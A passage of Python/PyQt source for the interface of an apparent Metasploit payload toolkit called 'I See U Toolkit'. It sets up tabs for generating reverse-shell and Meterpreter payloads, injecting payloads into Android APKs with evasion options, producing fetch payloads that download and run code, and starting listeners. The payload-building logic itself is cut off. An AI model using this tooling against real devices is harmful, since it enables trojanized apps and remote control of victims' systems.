            row = i // 3
            col = i % 3
            
            card = QFrame()
            card.setFrameStyle(QFrame.Box)
            card.setStyleSheet("""
                QFrame {
                    background-color: #2D2D44;
                    border: 1px solid #3A3A4F;
                    border-radius: 8px;
                    padding: 15px;
                }
            """)
            
            card_layout = QVBoxLayout(card)
            
            icon_label = QLabel(icon)
            icon_label.setAlignment(Qt.AlignCenter)
            icon_label.setStyleSheet("font-size: 36px;")
            card_layout.addWidget(icon_label)
            
            title_label = QLabel(title)
            title_label.setAlignment(Qt.AlignCenter)
            title_label.setStyleSheet("font-weight: bold; font-size: 14px;")
            card_layout.addWidget(title_label)
            
            desc_label = QLabel(desc)
            desc_label.setAlignment(Qt.AlignCenter)
            desc_label.setWordWrap(True)
            desc_label.setStyleSheet("color: #B0B0B0; font-size: 12px;")
            card_layout.addWidget(desc_label)
            
            button = QPushButton("Open")
            button.clicked.connect(command)
            card_layout.addWidget(button)
            
            actions_layout.addWidget(card, row, col)
        
        # Info section
        info_frame = QFrame()
        info_frame.setFrameStyle(QFrame.Box)
        info_frame.setStyleSheet("""
            QFrame {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                border-radius: 8px;
                padding: 15px;
            }
        """)
        layout.addWidget(info_frame)
        
        info_label = QLabel("""
This toolkit generates Metasploit payloads with modern features and AI-assisted optimization.
It supports traditional payloads, fetch payloads, and multi-format generation.
WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL.
ALWAYS OBTAIN PROPER AUTHORIZATION.
        """)
        info_label.setWordWrap(True)
        info_label.setStyleSheet("color: #B0B0B0;")
        info_frame.layout = QVBoxLayout(info_frame)
        info_frame.layout.addWidget(info_label)
        
        layout.addStretch()
    
    def create_traditional_payload_tab(self):
        """Create the traditional payload generation tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Traditional Payload")
        
        layout = QHBoxLayout(tab_widget)
        
        # Left panel
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        layout.addWidget(left_panel, stretch=1)
        
        # Platform selection
        platform_group = QGroupBox("Target Platform")
        platform_layout = QVBoxLayout(platform_group)
        left_layout.addWidget(platform_group)
        
        self.platform_group = QButtonGroup(self)
        platforms = [("Windows", "windows"), ("Linux", "linux"), 
                    ("Android", "android"), ("macOS", "macos"), ("iOS", "ios")]
        
        for text, value in platforms:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.platform_group.addButton(radio)
            platform_layout.addWidget(radio)
        
        self.platform_group.buttons()[0].setChecked(True)
        
        # Payload type
        payload_group = QGroupBox("Payload Type")
        payload_layout = QVBoxLayout(payload_group)
        left_layout.addWidget(payload_group)
        
        self.payload_group = QButtonGroup(self)
        payload_types = [("Meterpreter", "meterpreter"), ("Shell", "shell")]
        
        for text, value in payload_types:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.payload_group.addButton(radio)
            payload_layout.addWidget(radio)
        
        self.payload_group.buttons()[0].setChecked(True)
        
        # Connection method
        conn_group = QGroupBox("Connection Method")
        conn_layout = QVBoxLayout(conn_group)
        left_layout.addWidget(conn_group)
        
        self.conn_group = QButtonGroup(self)
        conn_methods = [("Reverse TCP", "reverse_tcp"), 
                       ("Reverse HTTP", "reverse_http"), 
                       ("Reverse HTTPS", "reverse_https")]
        
        for text, value in conn_methods:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.conn_group.addButton(radio)
            conn_layout.addWidget(radio)
        
        self.conn_group.buttons()[0].setChecked(True)
        
        # Output format
        format_group = QGroupBox("Output Format")
        format_layout = QVBoxLayout(format_group)
        left_layout.addWidget(format_group)
        
        self.format_combo = QComboBox()
        self.format_combo.addItems(["exe", "dll", "service", "powershell", "elf", "apk", "macho", "raw"])
        format_layout.addWidget(self.format_combo)
        
        left_layout.addStretch()
        
        # Right panel
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        layout.addWidget(right_panel, stretch=1)
        
        # Connection settings
        conn_settings_group = QGroupBox("Connection Settings")
        conn_settings_layout = QFormLayout(conn_settings_group)
        right_layout.addWidget(conn_settings_group)
        
        self.lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("LHOST:", self.lhost_edit)
        
        self.lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        conn_settings_layout.addRow("LPORT:", self.lport_edit)
        
        self.payload_name_edit = QLineEdit("payload")
        conn_settings_layout.addRow("Payload Name:", self.payload_name_edit)
        
        # Encoding options
        encoding_group = QGroupBox("Encoding Options")
        encoding_layout = QVBoxLayout(encoding_group)
        right_layout.addWidget(encoding_group)
        
        self.use_encoding_check = QCheckBox("Use Encoding")
        encoding_layout.addWidget(self.use_encoding_check)
        
        encoder_layout = QHBoxLayout()
        encoder_layout.addWidget(QLabel("Encoder:"))
        self.encoder_combo = QComboBox()
        self.encoder_combo.addItems(self.toolkit.encoders)
        encoder_layout.addWidget(self.encoder_combo)
        encoding_layout.addLayout(encoder_layout)
        
        iterations_layout = QHBoxLayout()
        iterations_layout.addWidget(QLabel("Iterations:"))
        self.iterations_spin = QSpinBox()
        self.iterations_spin.setRange(1, 5)
        self.iterations_spin.setValue(1)
        iterations_layout.addWidget(self.iterations_spin)
        encoding_layout.addLayout(iterations_layout)
        
        # Action buttons
        button_layout = QHBoxLayout()
        right_layout.addLayout(button_layout)
        
        generate_btn = QPushButton("Generate Payload")
        generate_btn.clicked.connect(self.generate_traditional_payload)
        button_layout.addWidget(generate_btn)
        
        handler_btn = QPushButton("Start Handler")
        handler_btn.clicked.connect(self.start_handler_from_tab)
        button_layout.addWidget(handler_btn)
        
        view_btn = QPushButton("View Command")
        view_btn.clicked.connect(self.view_command)
        button_layout.addWidget(view_btn)
        
        right_layout.addStretch()
    
    def create_android_injection_tab(self):
        """Create the Android payload injection tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Android Injection")
        
        layout = QHBoxLayout(tab_widget)
        
        # Left panel
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        layout.addWidget(left_panel, stretch=1)
        
        # Connection settings
        conn_settings_group = QGroupBox("Connection Settings")
        conn_settings_layout = QFormLayout(conn_settings_group)
        left_layout.addWidget(conn_settings_group)
        
        self.android_lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("LHOST:", self.android_lhost_edit)
        
        self.android_lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        conn_settings_layout.addRow("LPORT:", self.android_lport_edit)
        
        self.android_payload_name_edit = QLineEdit("android_payload")
        conn_settings_layout.addRow("Payload Name:", self.android_payload_name_edit)
        
        # APK selection
        apk_group = QGroupBox("APK Selection")
        apk_layout = QVBoxLayout(apk_group)
        left_layout.addWidget(apk_group)
        
        apk_select_layout = QHBoxLayout()
        apk_select_layout.addWidget(QLabel("Original APK:"))
        self.original_apk_edit = QLineEdit()
        apk_select_layout.addWidget(self.original_apk_edit)
        
        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_apk)
        apk_select_layout.addWidget(browse_btn)
        
        apk_layout.addLayout(apk_select_layout)
        
        # Permissions
        perm_group = QGroupBox("Permissions")
        perm_layout = QVBoxLayout(perm_group)
        left_layout.addWidget(perm_group)
        
        self.android_permissions = {}
        for perm_group_name in self.toolkit.android_configs["permissions"].keys():
            check = QCheckBox(perm_group_name.title())
            self.android_permissions[perm_group_name] = check
            perm_layout.addWidget(check)
        
        left_layout.addStretch()
        
        # Right panel
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        layout.addWidget(right_panel, stretch=1)
        
        # Android settings
        android_settings_group = QGroupBox("Android Settings")
        android_settings_layout = QFormLayout(android_settings_group)
        right_layout.addWidget(android_settings_group)
        
        self.target_sdk_combo = QComboBox()
        self.target_sdk_combo.addItems(list(self.toolkit.android_configs["target_sdk_versions"].keys()))
        self.target_sdk_combo.setCurrentText("android_11")
        android_settings_layout.addRow("Target SDK:", self.target_sdk_combo)
        
        self.evasion_combo = QComboBox()
        self.evasion_combo.addItems(self.toolkit.android_configs["evasion_techniques"])
        android_settings_layout.addRow("Evasion Technique:", self.evasion_combo)
        
        # Keystore settings
        keystore_group = QGroupBox("Keystore Settings")
        keystore_layout = QFormLayout(keystore_group)
        right_layout.addWidget(keystore_group)
        
        self.keystore_path_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore"))
        keystore_layout.addRow("Keystore Path:", self.keystore_path_edit)
        
        self.keystore_pass_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"))
        self.keystore_pass_edit.setEchoMode(QLineEdit.Password)
        keystore_layout.addRow("Keystore Password:", self.keystore_pass_edit)
        
        self.key_alias_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"))
        keystore_layout.addRow("Key Alias:", self.key_alias_edit)
        
        self.key_pass_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("key_password", "android"))
        self.key_pass_edit.setEchoMode(QLineEdit.Password)
        keystore_layout.addRow("Key Password:", self.key_pass_edit)
        
        # Action buttons
        button_layout = QHBoxLayout()
        right_layout.addLayout(button_layout)
        
        inject_btn = QPushButton("Inject Payload")
        inject_btn.clicked.connect(self.inject_android_payload)
        button_layout.addWidget(inject_btn)
        
        handler_btn = QPushButton("Start Handler")
        handler_btn.clicked.connect(self.start_android_handler)
        button_layout.addWidget(handler_btn)
        
        right_layout.addStretch()
    
    def create_fetch_payload_tab(self):
        """Create the fetch payload generation tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Fetch Payload")
        
        layout = QVBoxLayout(tab_widget)
        
        # Info text
        info_label = QLabel("""
Fetch payloads generate commands that can be executed on remote systems
to download and execute payloads automatically. They support HTTP, HTTPS,
and TFTP protocols.
        """)
        info_label.setWordWrap(True)
        info_label.setStyleSheet("color: #B0B0B0; padding: 10px;")
        layout.addWidget(info_label)
        
        # Main content
        content_layout = QHBoxLayout()
        layout.addLayout(content_layout)
        
        # Left panel
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        content_layout.addWidget(left_panel, stretch=1)
        
        # Platform selection
        platform_group = QGroupBox("Target Platform")
        platform_layout = QVBoxLayout(platform_group)
        left_layout.addWidget(platform_group)
        
        self.fetch_platform_group = QButtonGroup(self)
        platforms = [("Windows", "windows"), ("Linux", "linux"), 
                    ("Android", "android"), ("macOS", "macos")]
        
        for text, value in platforms:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.fetch_platform_group.addButton(radio)
            platform_layout.addWidget(radio)
        
        self.fetch_platform_group.buttons()[0].setChecked(True)
        
        # Protocol selection
        protocol_group = QGroupBox("Fetch Protocol")
        protocol_layout = QVBoxLayout(protocol_group)
        left_layout.addWidget(protocol_group)
        
        self.fetch_protocol_group = QButtonGroup(self)
        protocols = [("HTTP", "http"), ("HTTPS", "https")]
        
        for text, value in protocols:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.fetch_protocol_group.addButton(radio)
            protocol_layout.addWidget(radio)
        
        self.fetch_protocol_group.buttons()[0].setChecked(True)
        
        left_layout.addStretch()
        
        # Right panel
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        content_layout.addWidget(right_panel, stretch=1)
        
        # Connection settings
        conn_settings_group = QGroupBox("Connection Settings")
        conn_settings_layout = QFormLayout(conn_settings_group)
        right_layout.addWidget(conn_settings_group)
        
        self.fetch_lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("LHOST:", self.fetch_lhost_edit)
        
        self.fetch_lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        conn_settings_layout.addRow("LPORT:", self.fetch_lport_edit)
        
        self.fetch_srvhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("Fetch Server Host:", self.fetch_srvhost_edit)
        
        self.fetch_srvport_edit = QLineEdit("8080")
        conn_settings_layout.addRow("Fetch Server Port:", self.fetch_srvport_edit)
        
        self.fetch_payload_name_edit = QLineEdit("fetch_payload")
        conn_settings_layout.addRow("Payload Name:", self.fetch_payload_name_edit)
        
        # Action buttons
        button_layout = QHBoxLayout()
        right_layout.addLayout(button_layout)
        
        generate_btn = QPushButton("Generate Fetch Payload")
        generate_btn.clicked.connect(self.generate_fetch_payload)
        button_layout.addWidget(generate_btn)
        
        handler_btn = QPushButton("Start Handler")
        handler_btn.clicked.connect(self.start_fetch_handler)
        button_layout.addWidget(handler_btn)
        
        view_btn = QPushButton("View Command")
        view_btn.clicked.connect(self.view_fetch_command)
        button_layout.addWidget(view_btn)
        
        right_layout.addStretch()
    
    def create_multi_format_tab(self):
        """Create the multi-format payload generation tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Multi-Format")
        
        layout = QVBoxLayout(tab_widget)
        
        # Info text
        info_label = QLabel("""
Generate the same payload in multiple formats for compatibility testing.
This will create multiple files with different extensions in the output directory.
        """)
        info_label.setWordWrap(True)
        info_label.setStyleSheet("color: #B0B0B0; padding: 10px;")
        layout.addWidget(info_label)
        
        # Main content
        content_layout = QHBoxLayout()
        layout.addLayout(content_layout)
        
        # Left panel
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        content_layout.addWidget(left_panel, stretch=1)
        
        # Platform selection
        platform_group = QGroupBox("Target Platform")
        platform_layout = QVBoxLayout(platform_group)
        left_layout.addWidget(platform_group)
        
        self.multi_platform_group = QButtonGroup(self)
        platforms = [("Windows", "windows"), ("Linux", "linux"), 
                    ("Android", "android"), ("macOS", "macos"), ("iOS", "ios")]
        
        for text, value in platforms:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.multi_platform_group.addButton(radio)
            platform_layout.addWidget(radio)
        
        self.multi_platform_group.buttons()[0].setChecked(True)
        
        # Payload type
        payload_group = QGroupBox("Payload Type")
        payload_layout = QVBoxLayout(payload_group)
        left_layout.addWidget(payload_group)
        
        self.multi_payload_group = QButtonGroup(self)
        payload_types = [("Meterpreter", "meterpreter"), ("Shell", "shell")]
        
        for text, value in payload_types:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.multi_payload_group.addButton(radio)
            payload_layout.addWidget(radio)
        
        self.multi_payload_group.buttons()[0].setChecked(True)
        
        # Connection method
        conn_group = QGroupBox("Connection Method")
        conn_layout = QVBoxLayout(conn_group)
        left_layout.addWidget(conn_group)
        
        self.multi_conn_group = QButtonGroup(self)
        conn_methods = [("Reverse TCP", "reverse_tcp"), 
                       ("Reverse HTTP", "reverse_http"), 
                       ("Reverse HTTPS", "reverse_https")]
        
        for text, value in conn_methods:
            radio = QRadioButton(text)
            radio.setProperty("value", value)
            self.multi_conn_group.addButton(radio)
            conn_layout.addWidget(radio)
        
        self.multi_conn_group.buttons()[0].setChecked(True)
        
        left_layout.addStretch()
        
        # Right panel
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        content_layout.addWidget(right_panel, stretch=1)
        
        # Connection settings
        conn_settings_group = QGroupBox("Connection Settings")
        conn_settings_layout = QFormLayout(conn_settings_group)
        right_layout.addWidget(conn_settings_group)
        
        self.multi_lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("LHOST:", self.multi_lhost_edit)
        
        self.multi_lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        conn_settings_layout.addRow("LPORT:", self.multi_lport_edit)
        
        self.multi_payload_name_edit = QLineEdit("multi_payload")
        conn_settings_layout.addRow("Payload Name:", self.multi_payload_name_edit)
        
        # Encoding options
        encoding_group = QGroupBox("Encoding Options")
        encoding_layout = QVBoxLayout(encoding_group)
        right_layout.addWidget(encoding_group)
        
        self.multi_use_encoding_check = QCheckBox("Use Encoding")
        encoding_layout.addWidget(self.multi_use_encoding_check)
        
        encoder_layout = QHBoxLayout()
        encoder_layout.addWidget(QLabel("Encoder:"))
        self.multi_encoder_combo = QComboBox()
        self.multi_encoder_combo.addItems(self.toolkit.encoders)
        encoder_layout.addWidget(self.multi_encoder_combo)
        encoding_layout.addLayout(encoder_layout)
        
        iterations_layout = QHBoxLayout()
        iterations_layout.addWidget(QLabel("Iterations:"))
        self.multi_iterations_spin = QSpinBox()
        self.multi_iterations_spin.setRange(1, 5)
        self.multi_iterations_spin.setValue(1)
        iterations_layout.addWidget(self.multi_iterations_spin)
        encoding_layout.addLayout(iterations_layout)
        
        # Action buttons
        button_layout = QHBoxLayout()
        right_layout.addLayout(button_layout)
        
        generate_btn = QPushButton("Generate Multi-Format Payload")
        generate_btn.clicked.connect(self.generate_multi_format_payload)
        button_layout.addWidget(generate_btn)
        
        handler_btn = QPushButton("Start Handler")
        handler_btn.clicked.connect(self.start_multi_handler)
        button_layout.addWidget(handler_btn)
        
        right_layout.addStretch()
    
    def create_listener_tab(self):
        """Create the listener tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Listener")
        
        layout = QVBoxLayout(tab_widget)
        
        # Payload selection
        payload_group = QGroupBox("Payload Selection")
        payload_layout = QFormLayout(payload_group)
        layout.addWidget(payload_group)
        
        self.listener_payload_combo = QComboBox()
        self.listener_payload_combo.addItems([
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "osx/x64/meterpreter/reverse_tcp",
            "java/meterpreter/reverse_tcp"
        ])
        payload_layout.addRow("Payload Type:", self.listener_payload_combo)
        
        # Connection settings
        conn_settings_group = QGroupBox("Connection Settings")
        conn_settings_layout = QFormLayout(conn_settings_group)
        layout.addWidget(conn_settings_group)
        
        self.listener_lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        conn_settings_layout.addRow("LHOST:", self.listener_lhost_edit)
        
        self.listener_lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        conn_settings_layout.addRow("LPORT:", self.listener_lport_edit)
        
        # Terminal settings
        terminal_group = QGroupBox("Terminal Settings")
        terminal_layout = QVBoxLayout(terminal_group)
        layout.addWidget(terminal_group)
        
        self.open_terminal_check = QCheckBox("Open Terminal for Handler")
        self.open_terminal_check.setChecked(self.toolkit.config.get("open_terminal_for_handler", True))
        terminal_layout.addWidget(self.open_terminal_check)
        
        terminal_layout.addWidget(QLabel("Terminal Emulator:"))
        self.terminal_combo = QComboBox()
        self.terminal_combo.addItems(["auto"] + self.toolkit.terminal_emulators)
        self.terminal_combo.setCurrentText(self.toolkit.config.get("terminal_emulator", "auto"))
        terminal_layout.addWidget(self.terminal_combo)
        
        terminal_layout.addWidget(QLabel("Terminal Title:"))
        self.terminal_title_edit = QLineEdit(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
        terminal_layout.addWidget(self.terminal_title_edit)
        
        # Action buttons
        button_layout = QHBoxLayout()
        layout.addLayout(button_layout)
        
        start_btn = QPushButton("Start Listener")
        start_btn.clicked.connect(self.start_listener)
        button_layout.addWidget(start_btn)
        
        save_btn = QPushButton("Save Settings")
        save_btn.clicked.connect(self.save_listener_settings)
        button_layout.addWidget(save_btn)
        
        layout.addStretch()
    
    def create_settings_tab(self):
        """Create the settings tab."""
        tab_widget = QWidget()
        self.tab_widget.addTab(tab_widget, "Settings")
        
        layout = QVBoxLayout(tab_widget)
        
        # Create tab widget for settings categories
        settings_tab_widget = QTabWidget()
        layout.addWidget(settings_tab_widget)
        
        # General settings tab
        general_tab = QWidget()
        settings_tab_widget.addTab(general_tab, "General")
        
        general_layout = QVBoxLayout(general_tab)
        
        # Default settings
        default_group = QGroupBox("Default Settings")
        default_layout = QFormLayout(default_group)
        general_layout.addWidget(default_group)
        
        self.default_lhost_edit = QLineEdit(self.toolkit.config.get('default_lhost', '192.168.1.100'))
        default_layout.addRow("Default LHOST:", self.default_lhost_edit)
        
        self.default_lport_edit = QLineEdit(self.toolkit.config.get('default_lport', '4444'))
        default_layout.addRow("Default LPORT:", self.default_lport_edit)
        
        self.default_encoder_combo = QComboBox()
        self.default_encoder_combo.addItems(self.toolkit.encoders)
        self.default_encoder_combo.setCurrentText(self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
        default_layout.addRow("Default Encoder:", self.default_encoder_combo)
        
        self.default_format_edit = QLineEdit(self.toolkit.config.get('default_format', 'exe'))
        default_layout.addRow("Default Format:", self.default_format_edit)
        
        # Auto settings
        auto_group = QGroupBox("Auto Settings")
        auto_layout = QVBoxLayout(auto_group)
        general_layout.addWidget(auto_group)
        
        self.auto_start_handler_check = QCheckBox("Auto-start Handler")
        self.auto_start_handler_check.setChecked(self.toolkit.config.get('auto_start_handler', False))
        auto_layout.addWidget(self.auto_start_handler_check)
        
        self.auto_detect_ip_check = QCheckBox("Auto-detect IP")
        self.auto_detect_ip_check.setChecked(self.toolkit.config.get('auto_detect_ip', True))
        auto_layout.addWidget(self.auto_detect_ip_check)
        
        general_layout.addStretch()
        
        # Terminal settings tab
        terminal_tab = QWidget()
        settings_tab_widget.addTab(terminal_tab, "Terminal")
        
        terminal_layout = QVBoxLayout(terminal_tab)
        
        # Terminal emulator settings
        term_group = QGroupBox("Terminal Emulator Settings")
        term_layout = QFormLayout(term_group)
        terminal_layout.addWidget(term_group)
        
        self.term_emulator_combo = QComboBox()
        self.term_emulator_combo.addItems(["auto"] + self.toolkit.terminal_emulators)
        self.term_emulator_combo.setCurrentText(self.toolkit.config.get("terminal_emulator", "auto"))
        term_layout.addRow("Terminal Emulator:", self.term_emulator_combo)
        
        self.term_open_check = QCheckBox("Open Terminal for Handler")
        self.term_open_check.setChecked(self.toolkit.config.get("open_terminal_for_handler", True))
        term_layout.addRow("", self.term_open_check)
        
        self.term_title_edit = QLineEdit(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
        term_layout.addRow("Terminal Title:", self.term_title_edit)
        
        terminal_layout.addStretch()
        
        # Android settings tab
        android_tab = QWidget()
        settings_tab_widget.addTab(android_tab, "Android")
        
        android_layout = QVBoxLayout(android_tab)
        
        # Android settings
        android_settings_group = QGroupBox("Android Settings")
        android_settings_layout = QFormLayout(android_settings_group)
        android_layout.addWidget(android_settings_group)
        
        self.android_target_sdk_combo = QComboBox()
        self.android_target_sdk_combo.addItems(list(self.toolkit.android_configs["target_sdk_versions"].keys()))
        self.android_target_sdk_combo.setCurrentText(self.toolkit.config.get("android_settings", {}).get("target_sdk", "android_11"))
        android_settings_layout.addRow("Target SDK:", self.android_target_sdk_combo)
        
        self.android_evasion_combo = QComboBox()
        self.android_evasion_combo.addItems(self.toolkit.android_configs["evasion_techniques"])
        self.android_evasion_combo.setCurrentText(self.toolkit.config.get("android_settings", {}).get("evasion_technique", "apk_wrapper"))
        android_settings_layout.addRow("Evasion Technique:", self.android_evasion_combo)
        
        # Keystore settings
        keystore_group = QGroupBox("Keystore Settings")
        keystore_layout = QFormLayout(keystore_group)
        android_layout.addWidget(keystore_group)
        
        self.android_keystore_path_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore"))
        keystore_layout.addRow("Keystore Path:", self.android_keystore_path_edit)
        
        self.android_keystore_pass_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"))
        self.android_keystore_pass_edit.setEchoMode(QLineEdit.Password)
        keystore_layout.addRow("Keystore Password:", self.android_keystore_pass_edit)
        
        self.android_key_alias_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"))
        keystore_layout.addRow("Key Alias:", self.android_key_alias_edit)
        
        self.android_key_pass_edit = QLineEdit(self.toolkit.config.get("android_settings", {}).get("key_password", "android"))
        self.android_key_pass_edit.setEchoMode(QLineEdit.Password)
        keystore_layout.addRow("Key Password:", self.android_key_pass_edit)
        
        android_layout.addStretch()
        
        # Presets frame
        presets_group = QGroupBox("Presets")
        presets_layout = QHBoxLayout(presets_group)
        layout.addWidget(presets_group)
        
        save_preset_btn = QPushButton("Save Current Configuration")
        save_preset_btn.clicked.connect(self.save_preset_config)
        presets_layout.addWidget(save_preset_btn)
        
        load_preset_btn = QPushButton("Load Preset Configuration")
        load_preset_btn.clicked.connect(self.load_preset_config)
        presets_layout.addWidget(load_preset_btn)
        
        # Action buttons
        button_layout = QHBoxLayout()
        layout.addLayout(button_layout)
        
        save_btn = QPushButton("Save Settings")
        save_btn.clicked.connect(self.save_settings)
        button_layout.addWidget(save_btn)
        
        reset_btn = QPushButton("Reset to Defaults")
        reset_btn.clicked.connect(self.reset_settings)
        button_layout.addWidget(reset_btn)
    
    def create_status_bar(self):
        """Create the status bar."""
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        
        # Add progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumWidth(200)
        self.progress_bar.setVisible(False)
        self.status_bar.addPermanentWidget(self.progress_bar)
        
        # Add log button
        log_btn = QPushButton("Show Log")
        log_btn.clicked.connect(self.show_log_window)
        self.status_bar.addPermanentWidget(log_btn)
    
    def show_log_window(self):
        """Show the log window."""
        if not hasattr(self, 'log_window'):
            self.log_window = QDialog(self)
            self.log_window.setWindowTitle("I See U Toolkit - Log Output")
            self.log_window.resize(800, 500)
            
            layout = QVBoxLayout(self.log_window)
            
            # Header
            header_label = QLabel("Activity Log")
            header_label.setStyleSheet("font-size: 16px; font-weight: bold; color: #7B7FF5; margin: 10px;")
            layout.addWidget(header_label)
            
            # Log text
            self.log_text = QTextEdit()
            self.log_text.setReadOnly(True)
            self.log_text.setStyleSheet("""
                QTextEdit {
                    background-color: #2D2D44;
                    border: 1px solid #3A3A4F;
                    border-radius: 4px;
                    font-family: 'Consolas';
                    font-size: 12px;
                }
            """)
            layout.addWidget(self.log_text)
            
            # Buttons
            button_layout = QHBoxLayout()
            layout.addLayout(button_layout)
            
            clear_btn = QPushButton("Clear Log")
            clear_btn.clicked.connect(self.clear_log)
            button_layout.addWidget(clear_btn)
            
            save_btn = QPushButton("Save Log")
            save_btn.clicked.connect(self.save_log)
            button_layout.addWidget(save_btn)
        
        self.log_window.show()
        self.log_window.raise_()
        self.log_window.activateWindow()
    
    def show_about_dialog(self):
        """Show the about dialog."""
        about_dialog = QDialog(self)
        about_dialog.setWindowTitle("About I See U Toolkit")
        about_dialog.resize(500, 400)
        
        layout = QVBoxLayout(about_dialog)
        
        # Header
        header_label = QLabel("I See U Toolkit v2.0")
        header_label.setAlignment(Qt.AlignCenter)
        header_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #7B7FF5; margin: 20px;")
        layout.addWidget(header_label)
        
        subtitle_label = QLabel("Advanced Payload Generation Toolkit")
        subtitle_label.setAlignment(Qt.AlignCenter)
        subtitle_label.setStyleSheet("font-size: 14px; color: #E0E0E0; margin-bottom: 20px;")
        layout.addWidget(subtitle_label)
        
        # Content
        content = QTextEdit()
        content.setReadOnly(True)
        content.setStyleSheet("""
            QTextEdit {
                background-color: #2D2D44;
                border: 1px solid #3A3A4F;
                border-radius: 4px;
                padding: 15px;
            }
        """)
        content.setPlainText("""
I See U Toolkit is an advanced payload generation toolkit designed for security professionals and penetration testers.

Features:
• Generate payloads for multiple platforms (Windows, Linux, Android, macOS, iOS)
• Inject payloads into Android applications
• Create fetch payloads for remote execution
• Generate multi-format payloads for compatibility testing
• Start Metasploit listeners with terminal integration
• Modern, user-friendly interface with dark theme

Disclaimer:
This tool is for educational and authorized security testing purposes only. Unauthorized use of this tool for malicious purposes is illegal and unethical. Users are responsible for obtaining proper authorization before using this tool.

Version: 2.0
License: Educational Use Only
        """)
        layout.addWidget(content)
        
        # Button
        button_layout = QHBoxLayout()
        layout.addLayout(button_layout)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(about_dialog.accept)
        button_layout.addWidget(close_btn)
        
        about_dialog.exec_()
    
    def show_documentation(self):
        """Show documentation."""
        self.status_bar.showMessage("Documentation feature coming soon!", 3000)
    
    def show_progress(self):
        """Show progress bar."""
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)  # Indeterminate progress
    
    def hide_progress(self):
        """Hide progress bar."""
        self.progress_bar.setVisible(False)
    
    def update_status(self, message):
        """Update the status bar."""
        self.status_bar.showMessage(message)
        self.log_message(message)
    
    def log_message(self, message):
        """Add a message to the log window."""
        if hasattr(self, 'log_text'):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.log_text.append(f"{timestamp} - {message}")
    
    def clear_log(self):
        """Clear the log window."""
        if hasattr(self, 'log_text'):
            self.log_text.clear()
    
    def save_log(self):
        """Save the log to a file."""
        if hasattr(self, 'log_text'):
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save Log", "", "Text Files (*.txt);;All Files (*)"
            )
            if filename:
                with open(filename, 'w') as f:
                    f.write(self.log_text.toPlainText())
                self.update_status(f"Log saved to {filename}")
    
    def browse_apk(self):
        """Browse for an APK file."""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Select APK File", "", "APK Files (*.apk);;All Files (*)"
        )
        if filename:
            self.original_apk_edit.setText(filename)
    
    def generate_traditional_payload(self):
        """Generate a traditional payload."""
        try:
            # Get values from GUI
            platform = self.platform_group.checkedButton().property("value")
            payload_type = self.payload_group.checkedButton().property("value")
            conn_method = self.conn_group.checkedButton().property("value")
            output_format = self.format_combo.currentText()
            lhost = self.lhost_edit.text()
            lport = self.lport_edit.text()
            payload_name = self.payload_name_edit.text()
            
            # Validate inputs
            if not all([lhost, lport, payload_name]):
                QMessageBox.warning(self, "Input Error", "Please fill in all required fields.")
                return
            
